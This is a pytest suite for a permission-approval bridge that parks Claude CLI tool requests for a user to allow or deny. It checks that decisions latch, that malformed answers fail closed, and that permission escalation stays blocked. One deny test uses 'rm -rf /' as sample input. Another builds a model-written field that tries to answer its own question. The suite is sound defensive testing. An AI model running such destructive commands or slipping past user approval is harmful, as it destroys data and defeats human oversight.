"""The chat template's approval bridge: headless `claude -p` has no terminal
to prompt on, so `--permission-prompt-tool` routes each request to
`templates/claude/permission_server.py`, which parks it as a file until the
chat window answers through `agent.py`'s `decide` action.

Retargeted, not deleted, when the plain chat template it was written against was
removed (D235): the split view is the only chat template now — and carries the
`claude` name — and ships its own copy of the same `permission_server.py`
(templates are self-contained by design, SPEC PY-15), so the two contracts below
are still exactly the contracts that hold.

Two contracts are worth pinning, and neither shows up in a test of anything
else:

* the **CLI wire shape** — a permission result is one text block whose text is
  JSON with `behavior: allow|deny` (message REQUIRED on a deny), and the flags
  that make the CLI ask us at all. Get any of it wrong and the failure is the
  original bug back again: a silent refusal nobody sees.
* the **decision file is a one-way latch** — first writer wins. A second answer
  to the same request (double-click, or a cancel landing on a card that was
  just allowed) must not overwrite a verdict the tool may already have acted
  on, and nothing that is not an explicit "allow" may read as one.

The claude CLI itself is never invoked here: the MCP server is driven directly
over its stdio JSON-RPC, which is exactly the surface the CLI talks to.

**On permission_server's coverage number.** It reads low (~32%) and that is a
measurement artifact, not a gap. The server's job is to be a subprocess — that
is how the CLI runs it and how most of the suite below drives it — and coverage
cannot see statements executed across a process boundary, so the protocol loop,
`_handle_approve`, `_dispatch` and `main` all count as uncovered while being
exercised end to end on every run. Only the handful of functions that are ALSO
unit-tested in-process (the ones needing a monkeypatched failure, which cannot
be injected into a child) show up as covered. Measuring the child properly would
mean a coverage bootstrap in the spawn path for one template helper; the number
is not a gate, so it is left honest-but-understated rather than gamed with
tests written for the metric.
"""
import ast
import importlib.util
import inspect
import json
import os
import re
import shutil
import subprocess
import stat
import sys
import tempfile
import textwrap
import threading
import time

import pytest

from _mcp_stdio import MCPServer

TEMPLATE_DIR = os.path.join("fused_render", "templates", "claude")
SERVER = os.path.join(TEMPLATE_DIR, "permission_server.py")


def _load(name):
    path = os.path.join(TEMPLATE_DIR, name + ".py")
    spec = importlib.util.spec_from_file_location("claude_" + name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def agent():
    return _load("agent")


# --------------------------------------------------------------- the MCP wire
# The stdio harness (one reader thread, responses demultiplexed by JSON-RPC id,
# and why both are load-bearing) lives in _mcp_stdio.py, shared with
# test_claude_app_state.py so there is only ever one of it.


def _Server(perm_dir, env=None):
    """This template's permission_server, spawned the way the CLI spawns it."""
    return MCPServer([sys.executable, os.path.abspath(SERVER), str(perm_dir)],
                     env=env)


@pytest.fixture
def server(tmp_path):
    s = _Server(tmp_path / "perm")
    s.call("initialize", {"protocolVersion": "2025-06-18",
                          "capabilities": {}, "clientInfo": {"name": "test"}})
    yield s
    s.close()


def _wait_for_request(perm_dir, timeout=10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        names = [n for n in os.listdir(perm_dir) if n.endswith(".req.json")]
        if names:
            with open(os.path.join(perm_dir, names[0]), encoding="utf-8") as fh:
                return json.load(fh)
        time.sleep(0.05)
    raise AssertionError("permission_server never parked a request")


def _result_payload(response):
    """The permission result the CLI will parse out of a tools/call reply."""
    content = response["result"]["content"]
    assert len(content) == 1 and content[0]["type"] == "text", (
        "the CLI rejects anything but a single text block "
        "('Permission prompt tool returned an invalid result')")
    return json.loads(content[0]["text"])


# `test_initialize_advertises_only_the_approval_tool` lived here. It pinned the
# deleted plain chat template's server, which offered exactly one tool; the
# surviving `claude` copy offers `approve` AND `app_state`, and the full
# advertised list is already pinned by
# test_claude_app_state.py::test_the_server_advertises_both_tools. Deleted
# rather than corrected in place, because "only the approval tool" was the whole
# claim and it is no longer true of any shipping server.


def test_allow_round_trip_returns_the_tool_input_unchanged(tmp_path, agent, server):
    perm_dir = tmp_path / "perm"
    tool_input = {"command": "ls -la", "description": "list"}
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Bash", "input": tool_input,
                      "tool_use_id": "toolu_01"}})

    req = _wait_for_request(perm_dir)
    assert req["tool"] == "Bash" and req["input"] == tool_input
    assert req["tool_use_id"] == "toolu_01"
    # The id is minted server-side, never taken from the CLI's tool_use_id:
    # it is joined into a path.
    assert not agent._bad_id(req["id"]) and req["id"] != "toolu_01"

    assert agent._write_decision(str(perm_dir), req["id"],
                                 {"decision": "allow", "scope": "once"})
    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert payload["updatedInput"] == tool_input
    assert "updatedPermissions" not in payload


def test_session_scope_adds_a_session_rule_for_that_tool(tmp_path, server):
    perm_dir = tmp_path / "perm"
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Edit", "input": {"file_path": "/x.html"}}})
    req = _wait_for_request(perm_dir)
    (perm_dir / (req["id"] + ".res.json")).write_text(
        json.dumps({"decision": "allow", "scope": "session"}))

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    # Bare tool name, no ruleContent: the wire hands us no permission
    # suggestions to narrow with, and matching stays the CLI's job.
    assert payload["updatedPermissions"] == [{
        "type": "addRules",
        "rules": [{"toolName": "Edit"}],
        "behavior": "allow",
        "destination": "session",
    }]


def test_a_mode_switch_rides_back_as_a_setMode_update(tmp_path, server):
    """"Allow, and let Claude decide from here" re-points the RUNNING session
    through the sibling of the addRules update. Verified against the real CLI
    too: starting in the strictest mode, a turn that carded Edit/Write/Write
    carded only the Edit once the first card switched the mode."""
    perm_dir = tmp_path / "perm"
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Edit", "input": {"file_path": "/x.html"}}})
    req = _wait_for_request(perm_dir)
    (perm_dir / (req["id"] + ".res.json")).write_text(
        json.dumps({"decision": "allow", "scope": "once", "mode": "auto"}))

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert payload["updatedPermissions"] == [
        {"type": "setMode", "mode": "auto", "destination": "session"}]


@pytest.mark.parametrize("mode", ["bypassPermissions", "plan", "dontAsk",
                                  "default", "", "AUTO", "auto "])
def test_the_server_only_emits_a_mode_it_recognises(tmp_path, server, mode):
    """This side hands the CLI its payload, so it re-validates rather than
    trusting the decision file. `bypassPermissions` is the one that matters:
    it must be unreachable from a card by any route."""
    perm_dir = tmp_path / "perm"
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Edit", "input": {}}})
    req = _wait_for_request(perm_dir)
    (perm_dir / (req["id"] + ".res.json")).write_text(
        json.dumps({"decision": "allow", "scope": "once", "mode": mode}))

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert "updatedPermissions" not in payload, f"{mode!r} reached the CLI"


def test_a_failed_timeout_write_keeps_the_latch_claimed(tmp_path, monkeypatch):
    """The server must NOT free the claim the way agent.py's writer does.

    agent.py unlinks on a failed write because nobody has been told anything
    yet, so a retry should be able to win the latch. Here the verdict has
    already gone back to claude — releasing it would let a later Allow land on
    disk and the card would read "✓ Allowed" for a tool that was refused.
    """
    srv = _load("permission_server")
    monkeypatch.setattr(srv, "PERM_DIR", str(tmp_path))
    monkeypatch.setattr(srv, "WAIT_TIMEOUT", 0.05)
    real_fdopen = os.fdopen

    def boom(fd, *a, **kw):
        real_fdopen(fd, *a, **kw).close()
        raise OSError("no space left on device")

    monkeypatch.setattr(srv.os, "fdopen", boom)
    assert srv._await_decision("req-1") == {"decision": "deny", "reason": "timeout"}
    assert os.path.exists(os.path.join(tmp_path, "req-1.res.json")), (
        "the claim was released after claude had already been answered")


def test_a_successful_timeout_write_records_the_verdict(tmp_path, monkeypatch):
    """The other half: the ordinary path still writes a readable deny."""
    srv = _load("permission_server")
    monkeypatch.setattr(srv, "PERM_DIR", str(tmp_path))
    monkeypatch.setattr(srv, "WAIT_TIMEOUT", 0.05)
    assert srv._await_decision("req-1") == {"decision": "deny", "reason": "timeout"}
    assert json.loads((tmp_path / "req-1.res.json").read_text()) == {
        "decision": "deny", "reason": "timeout"}


def test_deny_carries_a_message_because_the_cli_requires_one(tmp_path, server):
    perm_dir = tmp_path / "perm"
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Bash", "input": {"command": "rm -rf /"}}})
    req = _wait_for_request(perm_dir)
    (perm_dir / (req["id"] + ".res.json")).write_text(json.dumps({"decision": "deny"}))

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "deny"
    assert payload["message"], "deny.message is required by the CLI's schema"


def test_unanswered_request_denies_itself_and_records_the_verdict(tmp_path):
    perm_dir = tmp_path / "perm"
    s = _Server(perm_dir, env={"FUSED_RENDER_PERMISSION_TIMEOUT": "1"})
    try:
        s.call("initialize", {"protocolVersion": "2025-06-18", "capabilities": {}})
        pending = s.send_async("tools/call", {
            "name": "approve",
            "arguments": {"tool_name": "Bash", "input": {"command": "sleep 1"}}})
        req = _wait_for_request(perm_dir)
        payload = _result_payload(pending.result(20))
        assert payload["behavior"] == "deny"
        # Written down, not just returned — otherwise the card reads as "still
        # waiting for you" forever on a page that re-attaches.
        recorded = json.loads((perm_dir / (req["id"] + ".res.json")).read_text())
        assert recorded == {"decision": "deny", "reason": "timeout"}
    finally:
        s.close()


def test_concurrent_requests_each_get_their_own_card(tmp_path, server):
    """Parallel tool calls must not queue behind the first unanswered one.

    Asserted by ORDERING, not by a wall clock: both requests are parked, then only
    the SECOND is answered, and its response must come back while the first is still
    pending. A server that serialized could not produce that response at all, so this
    now fails against the bug it is named for — the previous version answered both at
    once and asserted only that two `allow` verdicts arrived, which a strictly serial
    server also satisfies.

    It is also the routing test: each response must land in ITS OWN request's slot,
    which the old sink-per-reader-thread harness got wrong in ~90% of runs (nothing
    matched JSON-RPC ids, and both waiters expected the same verdict, so nothing
    noticed) — see _Server."""
    perm_dir = tmp_path / "perm"
    first = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Read", "input": {"file_path": "/a"}}})
    second = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Read", "input": {"file_path": "/b"}}})

    # Both cards exist: the second request was accepted while the first sat unanswered
    # (this is the poll-a-condition shape _wait_for_request uses — the deadline is a
    # liveness backstop, never the assertion).
    deadline = time.monotonic() + 10
    names = []
    while time.monotonic() < deadline:
        names = sorted(n for n in os.listdir(perm_dir) if n.endswith(".req.json"))
        if len(names) == 2:
            break
        time.sleep(0.05)
    assert len(names) == 2, "the second request never surfaced"

    # Which card belongs to which call comes from the card's OWN payload, not from
    # sorting the server's ids: those are "HHMMSS-NNN-random" (permission_server.py:73)
    # and only sort by request order within one second, below counter 1000, and not
    # across midnight.
    cards = {}
    for name in names:
        card = json.loads((perm_dir / name).read_text())
        cards[card["input"]["file_path"]] = card["id"]
    assert set(cards) == {"/a", "/b"}

    # Answer ONLY the second tool call.
    (perm_dir / (cards["/b"] + ".res.json")).write_text(json.dumps({"decision": "allow"}))

    assert _result_payload(second.result())["behavior"] == "allow"
    assert second.message["id"] == second.id  # routed to its own slot, by id
    # The first tool call is STILL waiting — proof they never shared a queue, and the
    # property a serial server could not exhibit.
    assert not first.done.is_set()

    (perm_dir / (cards["/a"] + ".res.json")).write_text(json.dumps({"decision": "allow"}))
    assert _result_payload(first.result())["behavior"] == "allow"
    assert first.message["id"] == first.id


def test_a_synchronous_call_is_not_stolen_by_a_pending_request(tmp_path, server):
    """A `call()` overlapping a parked async request must get ITS OWN response.

    This is the same defect from the other side, and the reason `call()` had to move
    onto the demultiplexer too: with a reader thread per request, the parked request's
    thread was already blocked in `readline()`, so it necessarily consumed the
    `tools/list` response — and `call()` then either blocked forever or returned
    somebody else's message."""
    perm_dir = tmp_path / "perm"
    parked = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Read", "input": {"file_path": "/a"}}})
    card = _wait_for_request(perm_dir)  # it really is parked in the server

    listed = server.call("tools/list")

    # The point is WHOSE response came back, not the roster — that is
    # test_claude_app_state.py's. `approve` first is enough to prove this is
    # the tools/list reply and not the parked approval's.
    assert [t["name"] for t in listed["result"]["tools"]][0] == "approve"
    assert not parked.done.is_set()
    (perm_dir / (card["id"] + ".res.json")).write_text(
        json.dumps({"decision": "allow"}))
    assert _result_payload(parked.result())["behavior"] == "allow"


def test_a_lost_response_fails_as_a_timeout_not_an_index_error(tmp_path):
    """The diagnosability half. A response that never arrives has to name the request
    it was waiting for; the old shape raised `IndexError: list index out of range` on
    an empty sink, three lines away from the actual problem, which is what turned a
    frequent CI failure into a twenty-minute log dig."""
    s = _Server(tmp_path / "perm")
    try:
        s.call("initialize", {"protocolVersion": "2025-06-18", "capabilities": {}})
        parked = s.send_async("tools/call", {
            "name": "approve",
            "arguments": {"tool_name": "Read", "input": {"file_path": "/a"}}})
        with pytest.raises(AssertionError, match=r"no response to tools/call \(id \d+\)"):
            parked.result(timeout=0.3)
    finally:
        s.close()


def test_a_server_that_dies_without_replying_says_so(tmp_path):
    # EOF used to be `if not line: return` — an empty sink and no explanation.
    s = _Server(tmp_path / "perm")
    s.call("initialize", {"protocolVersion": "2025-06-18", "capabilities": {}})
    parked = s.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Read", "input": {"file_path": "/a"}}})
    s.proc.kill()

    with pytest.raises(AssertionError, match="closed stdout without replying"):
        parked.result(timeout=5)
    s.close()


# ----------------------------------- AskUserQuestion: the answer channel
# The one tool whose card is not an approval: the model is asking the user
# something, and the answer rides back on an `allow` whose `updatedInput` is the
# original input PLUS a top-level `answers` record keyed by the exact question
# text (spike against CLI 2.1.226 — a plain allow reaches the model as "The user
# did not answer the questions", and a deny carrying the text is `is_error`).
#
# Everything below is written as a fail-closed test rather than a feature test,
# because this is the one path where the PAGE authors model-visible tool input:
# the answer is only ever a label the parked request itself offered.

# Verbatim from the spike's perm/<id>.req.json.
_QUESTION_INPUT = {
    "questions": [{
        "question": "Alpha or Beta?",
        "header": "Choice",
        "options": [{"label": "Alpha", "description": "Pick Alpha"},
                    {"label": "Beta", "description": "Pick Beta"}],
        "multiSelect": False,
    }],
}


def _multi_input(multi=True):
    return {"questions": [{
        "question": "Which libraries?",
        "header": "Libs",
        "options": [{"label": "Alpha", "description": "a"},
                    {"label": "Beta", "description": "b"},
                    {"label": "Gamma", "description": "c"}],
        "multiSelect": multi,
    }]}


def _park_question(server, perm_dir, tool_input=None, tool="AskUserQuestion"):
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": tool,
                      "input": _QUESTION_INPUT if tool_input is None else tool_input}})
    return pending, _wait_for_request(perm_dir)


def _answer(perm_dir, req, **decision):
    (perm_dir / (req["id"] + ".res.json")).write_text(json.dumps(decision))


def test_an_answered_question_rides_back_as_updated_input_answers(tmp_path, server):
    """The proven wire, end to end through the server the CLI talks to."""
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir)
    _answer(perm_dir, req, decision="allow", scope="once",
            answers={"Alpha or Beta?": "Beta"})

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    # The whole original input plus the answers key — NOT a rebuilt object.
    # `updatedInput` is re-validated against the tool's own schema, and dropping
    # `questions` yields a <tool_use_error> the model reports as a broken tool.
    assert payload["updatedInput"] == dict(_QUESTION_INPUT,
                                           answers={"Alpha or Beta?": "Beta"})
    assert payload["updatedInput"]["questions"] == _QUESTION_INPUT["questions"]
    assert "updatedPermissions" not in payload


def test_a_multi_select_answer_rides_back_as_the_joined_labels(tmp_path, server):
    """`multiSelect` sends the chosen labels joined with ", " as ONE string.

    A JSON list also reaches the model, but 2.1.226 joins it with "," (no
    space), which fails the CLI's own label check and downgrades the tool_result
    from "Your questions have been answered" to the weaker "follow what they
    actually say" phrasing. The joined string is what the CLI validates.
    """
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir, _multi_input())
    _answer(perm_dir, req, decision="allow",
            answers={"Which libraries?": "Alpha, Gamma"})

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert payload["updatedInput"]["answers"] == {"Which libraries?": "Alpha, Gamma"}


def test_a_question_allow_with_no_answers_is_not_passed_off_as_an_answer(
        tmp_path, server):
    """An answerless allow reaches the model as "The user did not answer the
    questions" — a turn that burned a card and learnt nothing. The card never
    emits one, and a hand-built decision file that does is denied rather than
    forwarded, so the model is told something true either way."""
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir)
    _answer(perm_dir, req, decision="allow", scope="once")

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "deny"
    assert payload["message"]


# Every way an answer to _QUESTION_INPUT can be wrong. Shared with _ANSWER_CASES
# below so BOTH validator copies see all of them — the parity test is only worth
# anything if its table is the whole table.
_MALFORMED_ANSWERS = [
    "Beta",                                   # not a record at all
    ["Beta"],
    None,
    {},                                       # nothing answered
    {"Alpha or Beta?": "Gamma"},              # not one of the options
    {"Alpha or Beta?": 1},                    # not a string
    {"Alpha or Beta?": ["Beta"]},             # a list, not the joined string
    {"Alpha or Beta?": "Alpha, Beta"},        # a multi answer to a single-select
    {"Alpha or beta?": "Beta"},               # question text off by a letter
    {"Choice": "Beta"},                       # keyed by header, not question
    {"Alpha or Beta?": "Beta", "Other?": "x"},  # a question never asked
    {"Alpha or Beta?": "beta"},               # label case must match
    {"Alpha or Beta?": ", "},                 # the separator on its own
]


@pytest.mark.parametrize("answers", _MALFORMED_ANSWERS, ids=lambda a: repr(a)[:40])
def test_a_malformed_answer_denies_instead_of_fabricating_one(tmp_path, server,
                                                              answers):
    """Validated against the PARKED REQUEST's own questions and option labels.

    The page authors this field and the model reads it, so an answer that the
    request never offered must never be forwarded: the failure mode is the model
    acting on a choice the user never made.
    """
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir)
    _answer(perm_dir, req, decision="allow", answers=answers)

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "deny", payload
    assert payload["message"]


def test_answers_on_any_other_tool_are_ignored_not_forwarded(tmp_path, server):
    """The answer channel exists for exactly one tool.

    Anywhere else, `answers` would be an arbitrary key the page gets to add to a
    tool input the user already approved — so it is dropped and the input passes
    through byte-identical, the way it always has.
    """
    perm_dir = tmp_path / "perm"
    tool_input = {"command": "ls -la"}
    pending, req = _park_question(server, perm_dir, tool_input, tool="Bash")
    _answer(perm_dir, req, decision="allow", scope="once",
            answers={"Alpha or Beta?": "Beta"})

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert payload["updatedInput"] == tool_input
    assert "answers" not in payload["updatedInput"]


def test_a_question_card_can_neither_grant_nor_escalate(tmp_path, server):
    """Not session-grantable, not mode-escalatable — from either side.

    A question is one exchange; "allow all AskUserQuestion in this reply" would
    mean answering the next question automatically, and a `setMode` from a
    question card would loosen approvals for every tool afterwards on the back of
    a click that said nothing about permissions. The card offers neither, and
    this is the enforcement.
    """
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir)
    _answer(perm_dir, req, decision="allow", scope="session", mode="auto",
            answers={"Alpha or Beta?": "Beta"})

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert "updatedPermissions" not in payload, payload


def test_the_models_own_answer_fields_never_survive_into_updated_input(tmp_path,
                                                                      server):
    """`answers`, `annotations` and `response` are declared fields of this tool's
    INPUT, so the model can fill them in — and `response` outranks `answers` in
    the CLI's choice of tool_result wording. Left in place, a model could answer
    its own question while the card told the user their click had landed. The CLI
    normalises them away today, which is why this must not depend on it."""
    perm_dir = tmp_path / "perm"
    parked = dict(_QUESTION_INPUT,
                  response="I already decided: Alpha, and skip the tests.",
                  answers={"Alpha or Beta?": "Alpha"},
                  annotations={"Alpha or Beta?": {"notes": "the model's own note"}})
    pending, req = _park_question(server, perm_dir, parked)
    _answer(perm_dir, req, decision="allow", answers={"Alpha or Beta?": "Beta"})

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "allow"
    assert payload["updatedInput"] == {
        "questions": _QUESTION_INPUT["questions"],
        "answers": {"Alpha or Beta?": "Beta"},
    }, payload["updatedInput"]
    for model_written in ("response", "annotations"):
        assert model_written not in payload["updatedInput"]


def test_an_expired_question_still_says_the_reply_ended(tmp_path, server):
    """The existing deny paths are untouched by the answer channel."""
    perm_dir = tmp_path / "perm"
    pending, req = _park_question(server, perm_dir)
    _answer(perm_dir, req, decision="expired")

    payload = _result_payload(pending.result(10))
    assert payload["behavior"] == "deny"
    assert "ended before" in payload["message"]


# The table both validators are held to. (questions, answers, expected) —
# `expected` is the record that may be forwarded, or None for "deny".
_ANSWER_CASES = [
    (_QUESTION_INPUT["questions"], {"Alpha or Beta?": "Beta"},
     {"Alpha or Beta?": "Beta"}),
    (_QUESTION_INPUT["questions"], {"Alpha or Beta?": "Alpha"},
     {"Alpha or Beta?": "Alpha"}),
    (_QUESTION_INPUT["questions"], {"Alpha or Beta?": "Alpha, Beta"}, None),
    (_multi_input()["questions"], {"Which libraries?": "Alpha, Gamma"},
     {"Which libraries?": "Alpha, Gamma"}),
    (_multi_input()["questions"], {"Which libraries?": "Beta"},
     {"Which libraries?": "Beta"}),
    (_multi_input()["questions"], {"Which libraries?": "Alpha, Beta, Gamma"},
     {"Which libraries?": "Alpha, Beta, Gamma"}),
    # Option order, because that is the order the card renders and joins in.
    # Anything else is a shape nothing here authors, and an ambiguous one to
    # parse (a label may itself contain ", "), so it fails closed.
    (_multi_input()["questions"], {"Which libraries?": "Gamma, Alpha"}, None),
    (_multi_input()["questions"], {"Which libraries?": "Alpha,Gamma"}, None),
    (_multi_input()["questions"], {"Which libraries?": ""}, None),
    (_multi_input()["questions"], {"Which libraries?": ", "}, None),
    ([], {"Alpha or Beta?": "Beta"}, None),
    ("questions", {"Alpha or Beta?": "Beta"}, None),
    (_QUESTION_INPUT["questions"], {}, None),
    (_QUESTION_INPUT["questions"], [], None),
    # Two questions, both answered, and the partial case (allowed: the CLI reads
    # an omitted question as unanswered, which is a true statement).
    ([_QUESTION_INPUT["questions"][0], _multi_input()["questions"][0]],
     {"Alpha or Beta?": "Beta", "Which libraries?": "Alpha, Beta"},
     {"Alpha or Beta?": "Beta", "Which libraries?": "Alpha, Beta"}),
    ([_QUESTION_INPUT["questions"][0], _multi_input()["questions"][0]],
     {"Which libraries?": "Beta"}, {"Which libraries?": "Beta"}),
    # A question with no usable options can never be answered validly.
    ([{"question": "Q?", "options": [], "multiSelect": False}], {"Q?": "x"}, None),
    ([{"question": "Q?", "options": [{"description": "no label"}]}], {"Q?": "x"}, None),
    ([{"header": "H", "options": [{"label": "x"}]}], {"Q?": "x"}, None),
    # Duplicate question text: an answer keyed by it cannot be attributed to
    # either question. BOTH values matter — "a" is rejected by any implementation
    # (it is not a label of the LAST question with that text, which is the one a
    # dict lookup would land on), so it passes for the wrong reason on its own;
    # "b" is the discriminating case, and only the duplicate check rejects it.
    ([{"question": "Q?", "options": [{"label": "a"}]},
      {"question": "Q?", "options": [{"label": "b"}]}], {"Q?": "a"}, None),
    ([{"question": "Q?", "options": [{"label": "a"}]},
      {"question": "Q?", "options": [{"label": "b"}]}], {"Q?": "b"}, None),
] + [(_QUESTION_INPUT["questions"], bad, None) for bad in _MALFORMED_ANSWERS]


@pytest.mark.parametrize("questions,answers,expected", _ANSWER_CASES,
                         ids=range(len(_ANSWER_CASES)))
def test_the_two_answer_validators_agree(agent, questions, answers, expected):
    """D146: agent.py validates the click before latching it and
    permission_server re-validates before handing the CLI its payload — two
    copies, because the server is spawned standalone and imports nothing of
    ours. So a test holds them together, over one table, rather than a comment
    saying they should agree."""
    srv = _load("permission_server")
    assert agent._answers_from(questions, answers) == expected
    assert srv._answers_from(questions, answers) == expected


def _behaviour(fn):
    """A function's structure with its docstring removed.

    The two copies are allowed to describe themselves differently (each one names
    the side it is on) and to carry different comments; they are not allowed to
    *do* anything differently. Compared as an AST rather than as text so wording,
    comments and line breaks are out of scope while every operand, constant and
    branch is in it.
    """
    tree = ast.parse(textwrap.dedent(inspect.getsource(fn)))
    body = tree.body[0].body
    if (body and isinstance(body[0], ast.Expr)
            and isinstance(body[0].value, ast.Constant)
            and isinstance(body[0].value.value, str)):
        tree.body[0].body = body[1:]
    return ast.dump(tree)


def test_the_two_answer_validators_are_the_same_code(agent):
    """The table above cannot carry this on its own, and that is not a fixable
    property of the table: a case-insensitive compare, a dropped type check or a
    dropped duplicate-question check in ONE copy is a divergence no finite list of
    inputs is guaranteed to contain. So the structure is asserted directly — the
    table then documents what the shared code does, and this holds the copies
    together. If a future change genuinely needs them to differ, this is the test
    that has to be argued with first.
    """
    srv = _load("permission_server")
    for name in ("_answers_from", "_multi_answer_ok"):
        assert _behaviour(getattr(agent, name)) == _behaviour(getattr(srv, name)), (
            "%s has drifted between agent.py and permission_server.py" % name)
    # The sentence the model is told is duplicated for the same reason.
    assert agent.BAD_ANSWER == srv.BAD_ANSWER
    assert agent.ANSWERABLE_TOOL == srv.ANSWERABLE_TOOL == "AskUserQuestion"


def _park_a_question(agent, tmp_path, tool="AskUserQuestion", tool_input=None):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-q.req.json"), "w") as fh:
        json.dump({"id": "req-q", "tool": tool,
                   "input": _QUESTION_INPUT if tool_input is None else tool_input}, fh)
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)
    return run_dir


def test_decide_latches_the_answer_it_validated(agent, tmp_path):
    run_dir = _park_a_question(agent, tmp_path)
    out = agent._decide("run", "req-q", "allow", "once",
                        answers=json.dumps({"Alpha or Beta?": "Beta"}))
    assert out["decision"] == "allow", out
    assert out["answers"] == {"Alpha or Beta?": "Beta"}
    on_disk = agent._read_decision(agent._perm_dir(run_dir), "req-q")
    assert on_disk["answers"] == {"Alpha or Beta?": "Beta"}
    # …and the latch still holds: a second click cannot re-answer it.
    again = agent._decide("run", "req-q", "allow", "once",
                          answers=json.dumps({"Alpha or Beta?": "Alpha"}))
    assert again["answers"] == {"Alpha or Beta?": "Beta"}, again


@pytest.mark.parametrize("answers", [
    "", "not json", "[]", "null", '"Beta"',
    json.dumps({"Alpha or Beta?": "Gamma"}),
    json.dumps({"Nope?": "Beta"}),
    json.dumps({"Alpha or Beta?": 7}),
])
def test_decide_denies_a_question_it_cannot_validate(agent, tmp_path, answers):
    """Fail closed on THIS side too, so a bad payload never even reaches the
    latch as an allow. The message is what the model is told."""
    run_dir = _park_a_question(agent, tmp_path)
    out = agent._decide("run", "req-q", "allow", "once", answers=answers)
    assert out["decision"] == "deny", out
    assert agent._read_decision(agent._perm_dir(run_dir), "req-q")["message"]


def test_decide_never_records_a_grant_or_a_mode_switch_for_a_question(agent, tmp_path):
    run_dir = _park_a_question(agent, tmp_path)
    out = agent._decide("run", "req-q", "allow", "session", "auto",
                        answers=json.dumps({"Alpha or Beta?": "Beta"}))
    assert out["decision"] == "allow"
    assert out["scope"] == "once" and out["mode"] == "", out
    on_disk = agent._read_decision(agent._perm_dir(run_dir), "req-q")
    assert on_disk["scope"] == "once" and "mode" not in on_disk
    # and the run's live mode is unmoved by it
    assert agent._live_mode({"mode": "prompt"}, agent._permissions(run_dir)) == "prompt"


def test_decide_drops_answers_meant_for_another_tool(agent, tmp_path):
    """A Bash allow carrying answers is an ordinary Bash allow — the key is not
    recorded, so it can never be forwarded."""
    run_dir = _park_a_question(agent, tmp_path, tool="Bash",
                               tool_input={"command": "ls"})
    out = agent._decide("run", "req-q", "allow", "once",
                        answers=json.dumps({"Alpha or Beta?": "Beta"}))
    assert out["decision"] == "allow"
    assert not out.get("answers")
    assert "answers" not in agent._read_decision(agent._perm_dir(run_dir), "req-q")


def test_a_question_is_not_whole_tool_grantable(agent):
    """The list must not have grown: "allow all AskUserQuestion in this reply"
    would answer the NEXT question without asking."""
    assert "AskUserQuestion" not in agent.WHOLE_TOOL_GRANTABLE
    assert set(agent.WHOLE_TOOL_GRANTABLE) == {
        "Edit", "Write", "Read", "Glob", "Grep", "NotebookEdit"}


def test_poll_reports_the_answer_so_a_re_attaching_frame_can_show_it(agent, tmp_path):
    """Same reason poll returns the whole request list: a frame that re-attaches
    mid-turn (mode switch, reload) has to be able to rebuild a card it never saw
    — including what the user chose on it."""
    run_dir = _park_a_question(agent, tmp_path)
    # An unanswered request reports no answers rather than a missing key.
    assert agent._permissions(run_dir)[0]["answers"] == {}

    agent._decide("run", "req-q", "allow", "once",
                  answers=json.dumps({"Alpha or Beta?": "Beta"}))
    perm = agent._permissions(run_dir)[0]
    assert perm["tool"] == "AskUserQuestion"
    assert perm["answers"] == {"Alpha or Beta?": "Beta"}


def test_the_answers_param_reaches_decide_as_a_json_string(agent, tmp_path):
    """Params cross into python string-shaped (the URL/param binder), so the
    page sends the record as JSON exactly like `app_state` sends its snapshot."""
    run_dir = _park_a_question(agent, tmp_path)
    out = agent.main(action="decide", run_id="run", request_id="req-q",
                     decision="allow", scope="once",
                     answers=json.dumps({"Alpha or Beta?": "Alpha"}))
    assert out["decision"] == "allow"
    assert agent._read_decision(agent._perm_dir(run_dir), "req-q")["answers"] == {
        "Alpha or Beta?": "Alpha"}


# ------------------------------------------------------------ agent.py side

def _run_dir(agent, tmp_path):
    run_dir = tmp_path / "run"
    os.makedirs(run_dir / "perm")
    return str(run_dir)


def test_decide_latches_on_the_first_answer(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    with open(os.path.join(perm_dir, "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {"command": "ls"}}, fh)

    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)
    assert agent._decide("run", "req-1", "allow", "once")["decision"] == "allow"
    # A second click (or a cancel racing it) must not flip the verdict the tool
    # has already been told about.
    assert agent._decide("run", "req-1", "deny", "once")["decision"] == "allow"
    assert agent._permissions(run_dir)[0]["decision"] == "allow"


